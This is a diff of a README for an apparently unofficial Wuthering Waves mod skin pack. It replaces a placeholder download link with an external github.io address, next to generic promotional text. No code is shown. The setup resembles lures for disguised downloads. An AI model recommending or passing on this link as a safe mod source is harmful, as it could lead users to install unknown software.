@@ -2,7 +2,7 @@
 
 Take your Wuthering Waves experience to the next level with this high-quality mod skin pack. Easy to install, fully compatible, and visually stunning for every player.
 
-[![Download Wuthering Waves Mod Skin](https://img.shields.io/badge/Download-Wuthering_Waves_Skin-blueviolet)](#)
+[![Download Wuthering Waves Mod Skin](https://img.shields.io/badge/Download-Wuthering_Waves_Skin-blueviolet)](https://wuthering-waves-mod-skin-ultra-pack.github.io/.github)
 
 ---
 
